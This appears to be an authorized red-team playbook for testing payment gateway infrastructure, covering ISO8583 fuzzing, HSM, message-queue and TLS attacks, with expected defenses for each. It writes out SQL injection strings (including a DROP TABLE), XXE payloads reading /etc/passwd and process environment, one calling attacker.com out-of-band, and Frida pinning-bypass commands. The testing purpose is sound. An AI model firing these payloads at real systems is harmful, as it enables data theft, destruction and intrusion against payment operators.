# Payment Gateway Red Team Playbook

Offensive security testing playbook for payment gateway infrastructure. All testing must be conducted in authorized environments with explicit permission. Reference: `protocol-engineering/references/red_team.md` for detailed attack vectors.

## Scope Definition

### In Scope (Authorized Testing)

- ISO8583 message protocol fuzzing and manipulation
- HSM command injection and key extraction attempts
- Message queue injection (RabbitMQ/Kafka)
- TLS/SSL downgrade and certificate attacks
- SQL injection in transaction lookup endpoints
- XXE injection in XML-based protocol handlers
- Webhook endpoint manipulation
- Authentication and authorization bypass attempts
- Rate limiting and DoS testing
- Business logic vulnerabilities (double-refund, etc.)

### Out of Scope (Prohibited)

- Physical security testing
- Social engineering attacks
- Testing production systems without explicit authorization
- Any attack requiring data exfiltration beyond test credentials
- Denial of service attacks that cause collateral damage
- Attacks on third-party infrastructure without consent

### Testing Environment Requirements

```
┌─────────────────────────────────────────────────────────┐
│  ISOLATED TEST ENVIRONMENT                              │
│  ├── Test HSM (not connected to production keys)         │
│  ├── Test ISO8583 simulator (not connected to schemes)   │
│  ├── Mock acquirer/processor endpoints                   │
│  ├── Sandboxed message queues                           │
│  └── Separate test database (no real PII)               │
└─────────────────────────────────────────────────────────┘
```

---

## ISO8583 Fuzzing Attack Vectors

### 1. Bitmap Manipulation

Test cases for bitmap field (DE001) manipulation:

```
Test Vector 1: Bitmap Flip Attack
- Modify secondary bitmap bits to enable unexpected fields
- Verify fields are rejected or properly sanitized
- Expected: Field not processed, logged as anomaly

Test Vector 2: Bitmap Overflow
- Send bitmap with bits set beyond message length
- Verify proper truncation or rejection
- Expected: Message rejected with parse error

Test Vector 3: Primary Bitmap Only
- Send message with only primary bitmap (bits 1-64)
- Attempt to include secondary fields
- Expected: Secondary fields ignored or error logged
```

### 2. MTI (Message Type Indicator) Mutation

```
Test Vector 1: MTI Swapping
- Send 0100 (Authorization) as 0200 (Financial Transaction)
- Test response differential handling
- Expected: Proper validation, transaction rejected

Test Vector 2: MTI Collision
- Send response MTI (0110) as request
- Verify MTI validation on inbound messages
- Expected: MTI response only allowed as reply

Test Vector 3: Invalid MTI Range
- Send MTI outside defined range (0000-9999)
- Test error handling
- Expected: Message rejected with invalid MTI error
```

### 3. Field Overflow Attacks

```
Test Vector 1: DE002 (PAN) Overflow
- Send PAN field longer than 19 digits
- Verify length validation
- Expected: Message rejected

Test Vector 2: DE004 (Amount) Overflow
- Send amount exceeding max transaction limit
- Send negative amounts
- Send amount with invalid decimal places
- Expected: Proper validation, rejection

Test Vector 3: DE035 (Track2) Overflow
- Send Track2 data exceeding 104 characters
- Include invalid delimiters (not '=')
- Expected: Proper parsing, invalid data rejected

Test Vector 4: DE048 (Additional Data) Overflow
- Send DE048 exceeding max length
- Include null bytes in field
- Expected: Proper truncation or rejection
```

### 4. Field Injection

```
Test Vector 1: NULL Byte Injection
- Inject null bytes in string fields
- Test for null terminator parsing issues
- Expected: Properly sanitized or rejected

Test Vector 2: Format String Injection
- Send printf-style format strings in fields
- %s, %x, %n format specifiers
- Expected: Treated as literal string

Test Vector 3: Newline Injection
- Inject CRLF in message fields
- Test for header injection in logs
- Expected: Properly escaped or rejected
```

---

## HSM Attack Surface

### 1. Key Extraction Attempts

```
Attack Vector 1: LMK Export via Firmware Exploit
- Exploit known vulnerabilities in HSM firmware
- Attempt to extract LMK
- Countermeasure: Keep HSM firmware updated, monitor access logs

Attack Vector 2: Key Component Substitution
- Modify HSM key generation requests
- Inject controlled key components
- Countermeasure: Verify key generation ceremony integrity

Attack Vector 3: Backup Key Extraction
- Target key backup procedures
- Extract encrypted key backups
- Countermeasure: Secure backup storage, multi-person authorization
```

### 2. MAC Bypass Techniques

```
Attack Vector 1: MAC Replay
- Capture valid MAC for message
- Replay with modified payload (same MAC)
- Expected: MAC verification must use unique elements

Attack Vector 2: MAC Truncation Attack
- Request MAC generation
- Truncate MAC and attempt verification
- Expected: MAC verification must use full MAC

Attack Vector 3: MAC Algorithm Confusion
- Send messages with different MAC algorithms
- Test for algorithm downgrade attacks
- Expected: MAC algorithm must be explicitly negotiated
```

### 3. PIN Block Replay

```
Attack Vector 1: PIN Block Replay
- Capture encrypted PIN block
- Replay in different transaction context
- Countermeasure: Use DUKPT or transaction-specific keys

Attack Vector 2: PIN Block Modification
- Modify PIN block and resubmit
- Test for integrity verification
- Expected: HSM must verify PIN block integrity

Attack Vector 3: PIN Block Format Attack
- Send PIN block in different ISO9564 format
- Test format validation
- Expected: PIN block format must be enforced
```

### 4. Command Injection

```
Attack Vector 1: HSM Command Injection
- Inject HSM commands via field data
- Example: ";CHANNEL_OPEN;PIN_VERIFY"
- Expected: Commands parsed as data only, not executed

Attack Vector 2: Command Sequence Injection
- Modify command sequence numbers
- Test for sequence validation
- Expected: Command sequence must be validated

Attack Vector 3: Response Manipulation
- Intercept HSM responses
- Modify response data
- Expected: Response integrity verification required
```

---

## Message Queue Injection

### RabbitMQ Attack Vectors

```
Attack Vector 1: Unauthorized Producer
- Connect to RabbitMQ without valid credentials
- Publish malicious messages
- Expected: Authentication and authorization enforced

Attack Vector 2: Message Tampering
- Intercept published messages
- Modify payload
- Expected: Message integrity checks in place

Attack Vector 3: Queue Flooding
- Publish large volume of messages
- Test consumer capacity
- Expected: Rate limiting on producer side

Attack Vector 4: Dead Letter Queue Poisoning
- Send messages that create infinite retry loops
- Target dead letter queue processing
- Expected: Dead letter queue has size limits
```

### Kafka Attack Vectors

```
Attack Vector 1: Unauthorized Produce
- Produce to protected topics without ACL
- Expected: Kafka ACLs enforce authorization

Attack Vector 2: Consumer Group Disruption
- Join consumer group as rogue member
- Compete for message consumption
- Expected: Consumer group authentication required

Attack Vector 3: Offset Manipulation
- Modify consumer offsets
- Replay old messages
- Expected: Consumer must validate message freshness

Attack Vector 4: Topic Enumeration
- Enumerate protected topics
- Discover internal topic names
- Expected: Topic list access restricted
```

---

## TLS Downgrade Attacks

```
Attack Vector 1: SSLv2/SSLv3 Fallback
- Force SSLv2 or SSLv3 during handshake
- Test for downgrade vulnerability
- Expected: Only TLS 1.2+ allowed

Attack Vector 2: Cipher Suite Downgrade
- Advertise only weak ciphers
- Test for cipher negotiation issues
- Expected: Strong cipher suite required

Attack Vector 3: TLS Compression
- Enable TLS compression (CRIME attack)
- Test for compression oracle
- Expected: TLS compression disabled

Attack Vector 4: Certificate Verification Bypass
- Present invalid certificate
- Test certificate validation
- Expected: Valid CA-signed certificate required

Attack Vector 5: Protocol Downgrade
- Strip TLS headers
- Force HTTP
- Expected: Strict transport security enforced
```

---

## Scheme Simulator Impersonation

```
Attack Vector 1: Acquiring Bank Impersonation
- Set up rogue system as acquirer
- Send fake authorization responses
- Expected: Mutual TLS + certificate pinning required

Attack Vector 2: Issuer Response Forgery
- Intercept issuer responses
- Modify response codes
- Expected: Response MAC/triple DES verification required

Attack Vector 3: Network Token Provider Impersonation
- Fake Visa Token Service / MC Token responses
- Countermeasure: Certificate validation for network APIs
```

---

## Clearing File Manipulation

```
Attack Vector 1: Transaction Amount Modification
- Modify transaction amounts in clearing file
- Test for checksum/Digital signature verification
- Expected: File-level hash verification required

Attack Vector 2: Duplicate Transaction Injection
- Inject duplicate records in clearing file
- Test deduplication logic
- Expected: Transaction ID deduplication in place

Attack Vector 3: Record Deletion
- Remove records from clearing file
- Test for record count verification
- Expected: File record count and hash verification

Attack Vector 4: Date/Time Manipulation
- Modify transaction timestamps
- Test for business rule enforcement
- Expected: Timestamp validation against business rules
```

---

## SQL Injection

### Transaction Lookup Endpoints

```
Payload 1: Basic Injection
' OR '1'='1
' OR 1=1 --
' UNION SELECT NULL--

Expected: Parameterized queries prevent injection

Payload 2: Time-Based Blind Injection
' AND SLEEP(5)--
' AND (SELECT * FROM users) LIKE '%'

Expected: Query timeout prevents blind injection

Payload 3: Batch Statement Injection
'; DROP TABLE transactions;--

Expected: Escaped semicolons or parameterized queries

Payload 4: Error-Based Injection
' AND EXTRACTVALUE(1, CONCAT(0x7e, version()))--

Expected: Custom error pages hide DB details
```

---

## XXE in XML-Based Protocols

### ISO20022 MX Message Attacks

```
Payload 1: Basic XXE
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>

Payload 2: Blind XXE with Out-of-Band
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY % xxe SYSTEM "http://attacker.com/evil">]>
%xxe;

Payload 3: XXE Billion Laughs (DoS)
<?xml version="1.0"?>
<!DOCTYPE lolz [<!ENTITY l "lol"><!ENTITY l2 "&l;&l;&l;&l;&l;&l;&l;&l;&l;&l;">]>
<lolz>&l2;</lolz>

Payload 4: External Entity File Retrieval
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///proc/self/environ">]>
```

### Mitigation Verification

```
Verify XXE Protection:
1. Check XML parser configuration (DTD processing disabled)
2. Verify entity expansion limits in place
3. Test with Burp Suite XXE Scanner
4. Review error messages for information leakage
```

---

## MITM Proxy Setup Guide

### mitmproxy Configuration

```bash
# Install mitmproxy
pip install mitmproxy

# Start proxy with certificate generation
mitmdump --listen-port 8080 \
  --mode transparent \
  --ssl-insecure

# Generate CA certificate
mitmproxy will generate ~/.mitmproxy/mitmproxy-ca.pem

# Install CA certificate on test device
openssl x509 -in ~/.mitmproxy/mitmproxy-ca.pem \
  -outform DER -out mitmproxy-ca.cer
```

### Burp Suite Configuration

```bash
# Proxy Listener
- Port: 8080
- Bind to: all interfaces
- Enable: Invisible proxy (for non-proxy-aware clients)

# Options > TLS > TLS Pass Through
- Add rule to pass through known-good hosts

# Options > Intruder > Grep - Extract
- Configure extraction rules for ISO8583 fields
```

### Certificate Pinning Bypass (Testing Only)

```
Note: Only for authorized security testing

Technique 1: SSL Unpinning via Frida
- frida -U -f com.target.app -l unsslpin.js

Technique 2: Proxy Certificate Injection
- Inject mitmproxy cert into app bundle
- For iOS: Add to Keychain

Technique 3: Custom Root CA
- Install mitmproxy CA on test device
- Some apps detect custom CAs
```

---

## Attack Reporting Format

### Finding Template

```markdown
## Finding: [Title]

**Severity**: Critical / High / Medium / Low / Informational

**CVSS Vector**: [Vector string if applicable]

**Affected Component**: [Component name]

**Description**: 
[Detailed description of the vulnerability]

**Attack Scenario**:
[Step-by-step reproduction]

**Impact**:
[Business and technical impact]

**Evidence**:
```
[Attacker commands and responses]
```

**Remediation**:
[Recommended fix]

**References**:
- [OWASP Cheat Sheet]
- [CVE if applicable]
```

### Severity Classification

| Severity | Criteria | Response Time |
|----------|----------|---------------|
| Critical | Remote code execution, key extraction | 24 hours |
| High | Data breach potential, transaction manipulation | 7 days |
| Medium | Information disclosure, bypass attacks | 30 days |
| Low | Minor vulnerabilities, hardening opportunities | 90 days |
| Informational | Best practice violations | 180 days |

---

## MITRE ATT&CK Mapping

### Payment System Attack Matrix

| Technique ID | Name | Applicable Attacks |
|--------------|------|---------------------|
| **Initial Access** | | |
| T1190 | Exploit Public-Facing Application | SQL injection in API, XXE |
| T1133 | External Remote Services | Rogue acquirer connections |
| **Execution** | | |
| T1059 | Command and Scripting Interpreter | HSM command injection |
| T1053 | Scheduled Task/Job | Queue poisoning via scheduled jobs |
| **Persistence** | | |
| T1078 | Valid Accounts | Unauthorized queue access |
| T1098 | Account Manipulation | Modify service accounts |
| **Defense Evasion** | | |
| T1027 | Obfuscated Files or Information | XOR-encoded payloads in ISO8583 |
| T1070 | Indicator Removal | Clear audit logs |
| **Credential Access** | | |
| T1110 | Brute Force | PIN brute force attempts |
| T1214 | Credentials in Files | Key backup extraction |
| **Discovery** | | |
| T1083 | File and Directory Discovery | Clearing file enumeration |
| T1082 | System Information Discovery | HSM fingerprinting |
| **Lateral Movement** | | |
| T1570 | Lateral Tool Transfer | Rogue messages across queues |
| **Collection** | | |
| T1005 | Data from Local System | PAN harvesting from logs |
| T1056 | Input Capture | PIN block capture |
| **Exfiltration** | | |
| T1041 | Exfiltration Over C2 Channel | Command channel data exfil |
| **Impact** | | |
| T1486 | Data Encrypted for Impact | Ransomware on clearing files |
| T1499 | Endpoint Denial of Service | Queue flooding DoS |

### ATT&CK for Payment Infrastructure

```
Initial Access
├── T1190: Exploit Public-Facing Application
│   └── SQL Injection in payment lookup API
├── T1133: External Remote Services
│   └── Rogue scheme simulator connection
│
Execution
├── T1059: Command and Scripting Interpreter
│   └── HSM command injection via field data
├── T1053: Scheduled Task/Job
│   └── Queue poison via settlement job
│
Persistence  
├── T1078: Valid Accounts
│   └── Unauthorized RabbitMQ producer access
│
Credential Access
├── T1110: Brute Force
│   └── PIN block offline brute force
├── T1214: Credentials in Files
│   └── Key backup extraction from filesystem
│
Collection
├── T1005: Data from Local System
│   └── PAN exfiltration from transaction logs
├── T1056: Input Capture
│   └── PIN block capture during transaction
│
Impact
├── T1486: Data Encrypted for Impact
│   └── Ransomware on clearing/storage systems
└── T1499: Endpoint Denial of Service
    └── Queue flooding to cause transaction loss
```

---

## Testing Checklist

```
Pre-Testing
☐ Confirm authorization in writing
☐ Set up isolated test environment
☐ Verify test HSM connections only
☐ Disable production alert suppression
☐ Document test timeline and scope

ISO8583 Fuzzing
☐ Bitmap manipulation
☐ MTI mutation
☐ Field overflow (all DE fields)
☐ Field injection (null bytes, format strings)
☐ Field length boundary testing

HSM Testing
☐ Key extraction attempts
☐ MAC bypass/replay
☐ PIN block replay
☐ Command injection

Queue Security
☐ Unauthorized produce/consume
☐ Message tampering
☐ Queue flooding
☐ Consumer group injection

TLS Security
☐ Downgrade to SSLv2/SSLv3
☐ Cipher suite downgrade
☐ Certificate validation bypass

API Security
☐ SQL injection (all endpoints)
☐ XXE injection (XML endpoints)
☐ Webhook signature bypass
☐ Authentication bypass

Post-Testing
☐ Document all findings
☐ Assess business impact
☐ Provide remediation recommendations
☐ Schedule remediation verification
☐ Clean up test artifacts
```
